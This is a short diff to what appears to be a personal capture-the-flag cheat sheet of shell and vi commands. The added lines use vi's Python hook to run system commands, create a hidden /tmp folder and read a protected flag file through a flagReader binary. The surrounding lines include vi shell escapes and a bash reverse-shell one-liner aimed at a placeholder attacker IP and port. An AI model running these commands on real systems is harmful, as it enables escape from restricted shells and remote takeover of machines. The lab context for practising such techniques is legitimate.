@@ -187,6 +187,11 @@ vi file 1>&2
 :shell=/bin/bash
 :shell
 
+:python3 import os; os.system('mkdir /tmp/.gettheflag/')
+:python3 import os; os.system('/home/ctfuser/flagReader /.flag > /tmp/.gettheflag/test')
+:r /tmp/.gettheflag/test
+
+
 cat myfile.txt | tr -d '\n' > oneline.txt
 
 /bin/bash -i >& /dev/tcp/miIP/puerto 0>&1
